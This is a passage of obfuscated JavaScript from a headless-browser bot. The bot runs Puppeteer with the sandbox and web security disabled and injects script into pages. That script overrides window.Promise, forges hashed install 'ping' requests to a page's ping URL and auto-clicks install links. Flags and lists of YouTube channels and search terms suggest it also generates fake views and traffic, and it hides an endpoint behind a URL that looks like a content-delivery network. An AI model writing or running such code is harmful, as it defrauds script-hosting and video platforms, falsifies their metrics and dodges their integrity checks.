0x1 * -0x14b1 + 0xb * 0xd3 + 0xbdf) << y[-0xcd * 0x4 + 0xa31 * 0x3 + -0x2 * 0xdae & N++], P[N >> 0x1 * -0x20cf + -0x793 + 0x2864] |= (0x13c0 + 0x252c + -0x386c | L >> -0x7 * 0x4d2 + 0x1a * 0x125 + 0x402 & 0x254 * -0x10 + 0x4 * -0x95f + -0x6d1 * -0xb) << y[-0x45 * -0x4f + -0x1 * 0x2323 + 0xddb & N++], P[N >> 0x15dd + 0xbd6 * 0x1 + -0x21b1] |= (0xb37 * -0x3 + 0xaed + 0x1738 | -0xb3a + -0x7ef + -0x678 * -0x3 & L) << y[-0x1105 + 0x1 * -0x2595 + 0x369d & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1a40 + -0x18b * -0x15 + -0x5e7 ? (this['block'] = P[-0x43 * 0x95 + 0x1f71 + -0x1e * -0x41], this['start'] = N - (0x157b + 0x7 * 0x1 + -0x716 * 0x3), this['hash'](), this['hashed'] = -0x1 * -0x1ded + -0x1 * -0xfbb + 0x2da7 * -0x1) : this['start'] = N;
                }
                return this['bytes'] > 0xbd8ff98f + -0x190bcdd9f + 0x1 * 0x1d32ce40f && (this['hBytes'] += this['bytes'] / (0x1c5659450 + 0x9cfa9b50 + -0x1 * 0x162602fa0) << 0x31d + 0x1bf9 + -0x1f16, this['bytes'] = this['bytes'] % (-0x14c5775a * 0xc + 0x806101 * 0x2c + -0x4c * -0x65b9751)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0xdd9 + -0x5d7 + -0x801;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x1560 + 0x63d * -0x2 + 0x2 * 0x10f5] = this['block'], J[K >> -0xbe9 * -0x3 + 0x1bb2 * 0x1 + 0x11 * -0x3bb] |= x[-0x22a6 + -0x1225 * -0x2 + -0x3 * 0x8b & K], this['block'] = J[0xddc + -0x10a * -0x1a + -0x28d0], K >= 0x1a77 + -0x12f * 0x1 + -0x2 * 0xc88 && (this['hashed'] || this['hash'](), J[-0x116 * -0x1d + -0x1486 * 0x1 + -0xaf8] = this['block'], J[-0x3 * -0xb1 + 0x13 * 0x1a + 0x1 * -0x3f1] = J[0x213b + 0xacf + -0x2c09 * 0x1] = J[0x5ba * -0x4 + -0x939 + 0x2023] = J[-0x394 + -0x10fd + 0x1b7 * 0xc] = J[0x1e3d * -0x1 + 0x3 * -0x616 + 0x3083] = J[-0x98e + -0x27 * 0x4a + 0x14d9] = J[0x335 * 0x4 + -0x20 * 0x59 + -0x1ae] = J[0x1e12 + -0x581 + -0x188a] = J[0x2fa * -0xb + -0x26a * 0xb + 0x3b54] = J[-0x373 * 0x1 + -0x218a * -0x1 + -0x1e0e] = J[0x68d + -0x15 * 0x11c + -0x10c9 * -0x1] = J[0x3e4 + -0x1c30 + 0x1857] = J[0x73e + 0x2a2 * 0x1 + -0x9d4] = J[0x1 * -0x709 + -0x14f + 0x865] = J[0x1 * 0x11bd + 0x1 * -0x140c + 0x25d] = J[-0x1 * 0x25bf + 0x146e + 0x1160] = -0x137 * -0x19 + -0x16bb + -0x6 * 0x146), J[0x2 * 0x92 + 0x3 * -0xb51 + 0x20dd] = this['hBytes'] << -0x216a * -0x1 + -0x1 * 0x266f + 0x4 * 0x142 | this['bytes'] >>> -0xa63 * -0x1 + 0x2024 + -0x1 * 0x2a6a, J[-0xa85 + -0x12a0 * 0x1 + -0x7 * -0x42c] = this['bytes'] << -0x8 * -0xfe + -0x1 * -0x17c1 + -0x1fae, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0xc * -0x277 + 0x5 * -0x347 + 0x2e07; J < 0x1d01 * 0x1 + -0x2487 + 0x76 * 0x11; ++J)
                K = Q[J - (0x10a9 + 0x1ba0 + 0x2c46 * -0x1)] ^ Q[J - (-0x1 * -0x5f3 + 0x81 + -0x66c)] ^ Q[J - (0x176f * -0x1 + -0xb * 0x2a2 + -0x3473 * -0x1)] ^ Q[J - (-0x2f1 * 0x9 + 0xc18 + 0xe71 * 0x1)], Q[J] = K << 0x249e + -0x7c9 * 0x5 + 0x2 * 0x128 | K >>> 0x38 * 0x55 + 0x234 + -0x14ad * 0x1;
              for (J = -0x13b2 * -0x1 + 0x100e + -0x23c0; J < 0x1 * 0x9fc + -0x3 * -0xb06 + 0x2 * -0x157d; J += -0x1830 * -0x1 + -0xb89 * 0x1 + -0xca2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x180b * -0x1 + 0x7 * 0x40e + -0x2 * 0x229 | L >>> -0x46 + -0x1594 + 0x15f5) + (M & N | ~M & O) + P + (0x16f4fef3 + 0x18 * 0x3911127 + -0x120c2102) + Q[J] << 0x12b6 * -0x1 + -0x230b + 0x35c1) << 0x11 * -0x2e + 0x2 * 0xe5 + 0x149 | P >>> -0x24c0 + 0xb35 + 0x43 * 0x62) + (L & (M = M << -0x1383 + 0x12bd + -0x39 * -0x4 | M >>> 0x353 + 0x16a5 + 0xcfb * -0x2) | ~L & N) + O + (0x921a9f97 + 0x13bb791 * 0x4 + -0x3c870442) + Q[J + (-0x1a3 + -0x56e + -0xb5 * -0xa)] << 0xaac + 0x2329 + -0x2dd5) << -0xe2e * 0x1 + -0x1b02 + 0x2935 * 0x1 | O >>> 0x1d * -0x1f + -0x18f * -0xf + 0x1 * -0x13c3) + (P & (L = L << 0x8b6 + -0x6a6 * -0x1 + -0xf3e * 0x1 | L >>> 0x20a2 + 0x8bc + -0x295c) | ~P & M) + N + (-0x91a88e7 * -0x6 + -0x2c3ed807 + 0x8b * 0x939562) + Q[J + (-0x1e0e + 0x376 * 0x1 + 0x2 * 0xd4d)] << 0xb * -0x103 + -0x1 * 0x2632 + -0x1071 * -0x3) << -0xa * 0x2d6 + 0xff2 + 0xc6f | N >>> 0x3d5 + 0xf95 + -0x134f) + (O & (P = P << -0x1c12 + 0x226c + -0x4c * 0x15 | P >>> -0x1a20 + 0x1 * -0x343 + 0x1d65) | ~O & L) + M + (-0x6b * 0x1312264 + 0x13 * -0x53735e5 + -0xfdb7145 * -0x14) + Q[J + (0x982 + -0x2113 + 0x1794)] << -0x1e18 + 0x20e * -0xc + 0x36c0) << -0x3ac + -0x18e + 0x53f | M >>> 0xb6 + 0x1cac + 0x5 * -0x5db) + (N & (O = O << 0x108a * 0x1 + -0x1 * 0xca1 + -0x3cb | O >>> 0x1ad0 * -0x1 + 0x24fc + -0xa2a) | ~N & P) + L + (-0x15f23f7f + -0x1b8a19f0 + 0x8bfed308) + Q[J + (-0x3 * -0x6a2 + -0x1441 + 0x5f)] << -0xd8b + 0x411 * 0x1 + -0x97a * -0x1, N = N << -0x4 * 0x7ed + -0xaa * 0xb + 0x2720 | N >>> 0x10cd + -0x1e3f + -0x7 * -0x1ec;
              for (; J < -0x5d6 * 0x1 + -0xa7b + 0x1 * 0x1079; J += -0x15a * -0xa + -0x8a3 * 0x1 + -0x4dc)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x1ad7 + 0x22f6 + -0x3dc8 | L >>> -0x2363 + 0x176d * 0x1 + 0xc11) + (M ^ N ^ O) + P + (0x1 * -0xb3532ce7 + -0xc912475c + -0x52 * -0x5fda6a2) + Q[J] << 0x7 * 0x2f + -0x1 * -0x1697 + 0x5f8 * -0x4) << -0x1 * -0x2525 + 0x141 * 0x9 + 0x3 * -0x1023 | P >>> -0x140e + -0x1b83 * -0x1 + -0x75a) + (L ^ (M = M << -0x2196 * 0x1 + -0xe4b * 0x1 + 0x2fff | M >>> -0x15e8 + 0x167d + -0x93) ^ N) + O + (0x483 * -0x287d12 + 0x210e699 * -0xb + 0x13c401c6a) + Q[J + (0x118e + -0x760 + -0xa2d * 0x1)] << 0x1bd + -0x70a + 0x54d) << -0xdf * -0x5 + -0xd * -0xb3 + -0xd6d * 0x1 | O >>> -0x283 * 0x9 + 0x1835 * -0x1 + 0x2eeb) + (P ^ (L = L << 0x88a + -0xbff + -0x393 * -0x1 | L >>> -0x10f + -0x3 * -0x41 + 0x4e) ^ M) + N + (0xbccd87b5 + 0xa * -0x3fcc1a3 + -0x26140bb6) + Q[J + (-0x152b + 0x15b8 + -0x8b * 0x1)] << -0xfc5 + 0x1b89 + -0xbc4) << 0xd1e + -0x95 * -0x1d + -0x1dfa | N >>> 0x12c6 + -0x210f + -0xc * -0x133) + (O ^ (P = P << -0x2 * -0x5e7 + 0x327 * -0x7 + -0xa61 * -0x1 | P >>> 0x1e2c + -0xbc3 * -0x1 + 0x29ed * -0x1) ^ L) + M + (-0x4 * -0x2a47ca2f + -0x91a8b871 + 0x57637b56) + Q[J + (-0x1265 + -0x1 * -0x722 + -0x2 * -0x5a3)] << -0x241 * 0xb + 0xc58 + 0x1 * 0xc73) << 0x133f + 0x1684 + -0x29be | M >>> 0x6ea + -0x88 * -0x32 + -0x215f) + (N ^ (O = O << -0x2c * 0x2 + -0x1cb0 + 0x1d26 | O >>> -0x222f + -0x180 * 0xb + 0x32b1) ^ P) + L + (0x50bc4900 + 0x20fd * -0x303af + 0x818e2694) + Q[J + (0x23ed * -0x1 + 0x4b * 0x9 + 0x214e)] << -0x1 * 0x19f7 + -0x183a + 0x10bb * 0x3, N = N << 0x26eb + 0x4 * -0x63 + -0x2541 | N >>> -0x26ba + -0xc35 * -0x3 + 0x1 * 0x21d;
              for (; J < -0x24b1 + 0x450 + 0x209d; J += 0xf81 * 0x1 + 0x12a1 + -0x221d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x17ea + -0xcb1 + -0xb34 | L >>> 0xce3 * -0x2 + -0x17c9 * 0x1 + 0x31aa) + (M & N | M & O | N & O) + P - (-0x90b2 * -0xc952 + -0x97f9b020 + -0x14 * -0x78dcad0) + Q[J] << -0x22eb * 0x1 + 0x16f * 0x12 + -0x91d * -0x1) << 0xb * 0x253 + 0x18a7 + -0x47 * 0xb5 | P >>> 0xede + 0x484 + -0x1347) + (L & (M = M << -0x964 + -0x4ac + 0xe2e | M >>> -0x2 * 0x9e4 + -0x1891 * -0x1 + -0x1 * 0x4c7) | L & N | M & N) + O - (-0x9101851d * -0x1 + -0x1a7d * 0x3b034 + 0x41950f6b) + Q[J + (-0x16d9 * -0x1 + -0x621 + -0xb * 0x185)] << -0x92 * 0xe + 0x2c * -0xa + 0x9b4) << 0x12fd + 0xe4 * -0x8 + 0x17b * -0x8 | O >>> 0xb3e + -0xfa1 + 0x47e) + (P & (L = L << -0xdb * 0x18 + 0xe * -0x277 + 0x3728 | L >>> 0x1d39 + -0xd03 + -0x1034) | P & M | L & M) + N - (0x1 * 0x9a60e483 + -0xe0ff5618 + 0x1b * 0x6cbf3bb) + Q[J + (-0xd82 + -0x259c + -0x1 * -0x3320)] << -0x24ac * -0x1 + 0x26d6 + -0x4b82) << -0x1a16 + -0x92f * -0x3 + -0x172 | N >>> 0x1bf3 + -0xe15 * -0x1 + 0x1 * -0x29ed) + (O & (P = P << -0x9bd + 0x848 + 0x193 | P >>> 0x8e6 + -0x26d2 + 0x2 * 0xef7) | O & L | P & L) + M - (-0xa75bdffb + 0x5 * -0xbed264f + 0x153e1e2aa) + Q[J + (0x1 * -0x78b + 0x2f5 * 0x4 + 0x2 * -0x223)] << -0xe5f * -0x1 + -0x25f0 + 0x1791) << -0x37 * 0xb3 + 0x1bc8 + 0x25 * 0x4a | M >>> -0x29b + 0x171 + 0x145) + (N & (O = O << 0x1ffb + -0x1 * 0x9eb + -0x15f2 | O >>> 0x2425 + 0x46e * 0x2 + -0x2cff) | N & P | O & P) + L - (-0x1 * 0xb2428451 + -0xf * 0xb154db3 + -0x688c6b3 * -0x46) + Q[J + (0x1057 + -0x89f * -0x1 + -0x3e * 0x67)] << 0xdb9 * -0x1 + -0x751 * -0x5 + 0x4d * -0x4c, N = N << -0x8 * 0xf1 + -0xd9c + 0x38b * 0x6 | N >>> 0x118b + -0xd * 0xbe + 0x1 * -0x7e3;
              for (; J < 0x105a * -0x1 + 0x300 + 0xdaa; J += -0x2663 + 0x680 + -0xff4 * -0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x4a6 + -0xfb * 0x22 + 0x17 * 0x1a7 | L >>> -0xb2 * -0x2 + 0x1e7 * -0x1 + 0x9e) + (M ^ N ^ O) + P - (0x43ac763f + 0x1ccf85f3 + 0x1024 * -0x2a7f2) + Q[J] << 0x1d * -0x10 + 0x1acb + 0x4ff * -0x5) << 0x556 + -0x10a * -0x13 + 0x1 * -0x190f | P >>> 0x10d8 * 0x2 + 0x831 + 0x1 * -0x29c6) + (L ^ (M = M << -0xd2a + -0xb49 + -0x1 * -0x1891 | M >>> -0xe3e + -0x2c7 + 0x3 * 0x5ad) ^ N) + O - (0x30031446 * 0x1 + -0x51c18574 + 0x575baf58) + Q[J + (0x153 + 0x1deb + 0xb * -0x2d7)] << -0xe93 * -0x1 + 0x82e * 0x4 + 0x2f4b * -0x1) << 0x1 * -0x1178 + 0x5e * -0x2e + 0x2a5 * 0xd | O >>> 0x9 * 0x11d + -0x1366 + 0x97c) + (P ^ (L = L << 0x1e * 0x53 + -0x1645 + 0xca9 | L >>> -0x1e24 + -0xa1b * -0x3 + 0x2b * -0x1) ^ M) + N - (0xb4ffc * 0x6f7 + 0xb17175b * -0x1 + 0xe15be9f * -0x1) + Q[J + (-0xc88 * -0x1 + 0x2575 + 0xf * -0x355)] << -0xa4b + 0x2166 + 0xd * -0x1c7) << -0x385 * 0x4 + 0x1 * 0x921 + 0x6 * 0xd4 | N >>> -0x720 + 0x1eda + -0x179f) + (O ^ (P = P << -0x25ed + 0x16df + 0x3cb * 0x4 | P >>> 0x1049 + 0x56 * 0x4a + 0x1 * -0x2923) ^ L) + M - (0x3b194f9 * 0x1 + -0x474b0e51 + 0x7936b782 * 0x1) + Q[J + (0xf4 + 0x203f + -0x162 * 0x18)] << -0x2 * 0x1251 + 0x196a * 0x1 + 0xb38) << 0xed2 + 0x4b2 * 0x3 + 0x1 * -0x1ce3 | M >>> -0x147a + -0x1a14 + -0x5 * -0x955) + (N ^ (O = O << 0x1 * 0x739 + -0x5c9 + -0x152 | O >>> 0xc8c + 0x1396 + -0x202 * 0x10) ^ P) + L - (0x948f6fb + 0x15bfa31 + 0x2af84cfe) + Q[J + (-0x1d14 + -0x2645 + 0x435d)] << 0x7 * 0x4b5 + 0x9d * -0x15 + -0x7 * 0x2de, N = N << -0x1794 + -0x1 * -0x1199 + 0x619 | N >>> -0x133 * 0x1 + -0x2d * 0x57 + 0x10 * 0x108;
              this['h0'] = this['h0'] + L << 0x239 * 0xf + -0x3 * -0x43c + -0x2e0b, this['h1'] = this['h1'] + M << 0x2 * -0xeae + -0x532 + 0x1147 * 0x2, this['h2'] = this['h2'] + N << -0x9fa + 0x1439 + -0xa3f, this['h3'] = this['h3'] + O << -0x1 * -0x25c4 + -0x3d1 * -0x1 + 0x5 * -0x851, this['h4'] = this['h4'] + P << 0x1216 + 0x8 * 0x76 + -0x15c6;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x10aa + -0x1 * 0x8eb + 0x5 * -0x187 & 0x167b + -0x491 * 0x3 + 0xb * -0xcb] + w[J >> -0x7 * -0x357 + -0x1a04 + 0x2bb & 0x2 * -0x4cd + -0x2 * 0x11b4 + 0x2d11] + w[J >> -0x20f1 + -0x127 + -0x24 * -0xf3 & -0x1c5d + 0x1356 + -0x1 * -0x916] + w[J >> -0x1f11 + 0x4db * 0x5 + 0x6da * 0x1 & -0x2 * 0x1c1 + 0x1 * 0xcd1 + -0x940] + w[J >> 0x1 * -0x2095 + 0x1c02 + 0x49f * 0x1 & 0x1492 + -0x29f * 0x9 + 0x18a * 0x2] + w[J >> -0x5 * -0x6ef + 0x1d86 * -0x1 + -0x51d * 0x1 & 0x5b3 * 0x1 + -0x17f6 * -0x1 + 0x4ef * -0x6] + w[J >> -0xee6 * 0x1 + -0x11b9 * -0x2 + -0x12 * 0x124 & 0xba8 + 0x1b28 + -0x26c1] + w[0x896 + 0x2 * 0xd3 + -0xa2d & J] + w[K >> -0x17f6 + -0x155 * 0x2 + -0xec * -0x1d & 0xa3 * 0x1d + -0x1d40 + 0x56c * 0x2] + w[K >> 0x553 + 0x3ba + -0x8f5 * 0x1 & 0x89 * 0x20 + 0x1349 * 0x1 + -0x245a] + w[K >> -0x6fd * -0x2 + -0x2178 + 0x14e * 0xf & 0x1091 * -0x1 + -0x658 + 0xb7c * 0x2] + w[K >> -0x1558 + 0x1 * -0x1819 + -0x21 * -0x161 & -0x2336 + 0x2155 + 0x1f0] + w[K >> -0x31 * -0x45 + -0x165a + -0xb5 * -0xd & 0x1c90 + 0x885 + -0x2506] + w[K >> -0x1c1 * 0x7 + -0x131d + -0x1 * -0x1f6c & 0x1975 + -0xeed * 0x1 + -0xa79] + w[K >> 0x9af * 0x1 + 0x14e * -0x8 + 0xc5 * 0x1 & -0x1 * -0x3d2 + 0x1435 + -0x34 * 0x76] + w[0x4 * 0x88f + -0x3 * 0x76 + -0x20cb & K] + w[L >> -0x9e * -0x1 + -0x1e2d + 0x1dab & 0x640 + -0x19b3 + 0x1382] + w[L >> -0x1 * 0x1981 + 0x27c + 0x171d & 0x22b6 + -0x31c + 0x5 * -0x64f] + w[L >> 0x10ed + -0x1 * 0x329 + -0xdb0 & 0x1ebb * 0x1 + 0x1f5 + -0x20a1] + w[L >> 0xce3 * 0x2 + 0x1d36 + -0x36ec & 0x1ff3 * 0x1 + 0xf5e + -0x2e * 0x107] + w[L >> -0x825 + 0x1dd8 + -0x15a7 & 0x16a * -0x3 + -0x66b * 0x1 + 0xab8] + w[L >> 0x80 * -0x49 + -0x22ba + 0x4742 & -0x1 * 0xe3 + -0x1362 + -0x4 * -0x515] + w[L >> -0x1 * 0xab7 + -0x6c3 + 0x117e & -0x122d + -0x7 * -0x78 + -0x42 * -0x3a] + w[0xa7 * -0x11 + 0x1dcd * 0x1 + 0x3bb * -0x5 & L] + w[M >> 0xec5 + -0x1 * 0x2251 + 0x4 * 0x4ea & -0x21bc + 0x1 * -0x39b + 0x12b3 * 0x2] + w[M >> -0xff8 + 0x113 * 0xd + 0x219 & 0x39 * -0x82 + -0xe62 * 0x1 + -0x1 * -0x2b63] + w[M >> -0x1f * -0x35 + 0x307 * -0x1 + -0x350 & 0x26ef + 0x94d + 0x3 * -0x100f] + w[M >> 0xeec + 0x2d3 + -0x11af & 0xdd5 * -0x1 + 0x2e * 0x2b + 0x62a] + w[M >> -0x119d + -0x1be5 + 0x2d8e & -0x9 * 0x425 + 0x237e + 0x1de * 0x1] + w[M >> 0xa8b + 0x226c + -0x2cef & 0x1170 + 0x1970 + -0x2ad1] + w[M >> 0x2519 * 0x1 + -0xd32 + -0x17e3 & 0x1f * 0xf5 + -0x2027 + 0x28b] + w[-0x1af * 0x1 + -0xc79 * -0x1 + 0xabb * -0x1 & M] + w[N >> -0x23f + 0x1 * -0x1f93 + -0x56 * -0x65 & 0xa1a + 0x1 * 0x2dd + 0x4 * -0x33a] + w[N >> -0x2221 + -0x2276 * -0x1 + -0x3d & 0x5d1 * -0x1 + 0x29 * 0xef + 0x15 * -0x18b] + w[N >> -0xf2e + -0xa37 + 0x1979 & 0x3 * 0xc3d + -0x1861 * 0x1 + 0x7 * -0x1c1] + w[N >> -0x3 * -0x8ce + 0x215 + 0x1 * -0x1c6f & -0xaca + 0x1ffa + -0x1521] + w[N >> -0x148d * 0x1 + 0x4db * -0x6 + 0x31bb & 0x4e1 * -0x2 + -0x1 * 0x7ed + 0x1 * 0x11be] + w[N >> 0x369 * -0x1 + 0x660 * -0x1 + 0x9d1 & -0x7d8 + -0xbde + -0x7 * -0x2d3] + w[N >> 0x41 * -0x91 + 0x33 * -0x69 + 0x39c0 & -0x4d * -0x2f + -0x1f4f + 0x113b] + w[0x1a49 * -0x1 + -0x7cf * 0x5 + 0x4163 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1ecb + 0xf9d + -0x2e50 * 0x1 & 0x2e1 * 0x7 + 0x159e + -0x22 * 0x133,
                J >> -0xff1 + 0x50a + 0xaf7 & -0x245a + 0x1 * -0x1149 + -0x36a2 * -0x1,
                J >> -0x6d5 + 0x243 * -0x1 + -0x4 * -0x248 & -0x51f + -0xae * -0x33 + -0x1c8c,
                -0x2 * 0xb0b + 0x1cd9 + -0x5c4 & J,
                K >> 0x142a + -0x3b3 + -0x105f & -0x109b + -0x65 * -0x7 + 0xed7,
                K >> 0x1e99 + 0x46c + -0x22f5 & 0x2401 + 0x1275 + -0x3577 * 0x1,
                K >> 0x28b + 0x680 + 0x1 * -0x903 & 0x2 * 0x3af + 0xa94 + 0x10f3 * -0x1,
                0x1 * 0xe3 + 0x43 * -0x64 + 0x3a * 0x74 & K,
                L >> 0x199b + 0x15f7 + -0x2f7a & 0x180e + -0x380 + 0x685 * -0x3,
                L >> 0xa45 + -0x6 * -0x426 + -0x2319 & -0x3e0 + 0x461 * 0x8 + -0x1e29 * 0x1,
                L >> 0x2 * 0x3 + -0x220e + 0x2210 & -0x813 + -0x135f + 0x9 * 0x329,
                -0xe9a + 0x15d * 0x1 + 0xe3c & L,
                M >> 0x50d * 0x6 + -0x1d08 + -0x12e & -0x7 * -0x529 + -0x955 + -0x19cb,
                M >> -0xa7 * -0x7 + -0x1d69 * -0x1 + -0xb4e * 0x3 & 0x5c * -0x53 + 0x2d * -0x31 + 0x2770,
                M >> 0x41e * 0x1 + -0x1a * -0x3d + -0x149 * 0x8 & -0x14 * 0x1a5 + 0xe51 + 0x343 * 0x6,
                0x1f55 * -0x1 + 0x7af + 0x18a5 & M,
                N >> 0xb * 0x191 + 0x4a7 * -0x3 + -0xb * 0x4a & -0x1 * -0x117a + -0x42 * 0x62 + 0x8c9,
                N >> 0x196 + 0x67a * 0x4 + -0x1b6e & 0x16b3 + -0xae6 + -0xace,
                N >> 0x1849 + 0xca1 + 0x1 * -0x24e2 & -0x7c3 + 0x2406 + -0xa * 0x2ba,
                0x451 + 0x13 * -0x3d + 0x135 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x100e + 0x25c5 + 0x1d * -0xbf), (K = new DataView(J))['setUint32'](0x22dd + 0x115 * -0x7 + -0xe * 0x1f3, this['h0']), K['setUint32'](0x2 * -0xda0 + 0x1 * 0x2151 + 0x1 * -0x60d, this['h1']), K['setUint32'](0x1 * 0x18a7 + -0xae * -0x3 + -0x1aa9, this['h2']), K['setUint32'](-0x1 * 0xf29 + 0x9a4 * -0x3 + -0xd * -0x365, this['h3']), K['setUint32'](0x755 * 0x3 + 0x1e51 + -0x10 * 0x344, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x94a + 0x1b72 + -0x1228];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x2701 * 0x1 + -0x358 * 0xb + -0x1d * -0x29d;
            J[0xe * -0x24b + 0x1f99 + 0x81]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x236d + -0x1db * -0x15 + -0x38a] = L => {
              const V = d;
              let M = I['getAttribu' + 'te']('data-ping-' + V(0xf));
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1 * 0x4f1 + -0x3a * 0x2c + -0x17 * -0x38), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x16 * -0xd9 + -0x589 * 0x1 + 0x1830;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1e66 + -0x31c * -0x8 + 0x6e * -0x73), Promise['resolve'](-0x1407 + 0x958 + -0x3 * -0x390);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x15ae + 0x1 * 0x11d8 + 0x3d6 * 0x1; j < 0x2 * 0xe5d + 0x190c + -0x35c5; j++)
    i();
}
const NETWORK_PATIENCE = -0x8 * -0x277 + -0x671 * -0x5 + 0x14ad * -0x1 + (-0x25 * -0xa9 + 0x1 * -0x123d + -0x6 * -0xec) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x573 + -0x4 * 0x503 + 0x1982) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    W(0x0) + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x20d4 + 0x2d9 + 0x1dfb; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + X(0x2) + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + W(0x13) + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + W(0x7) + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 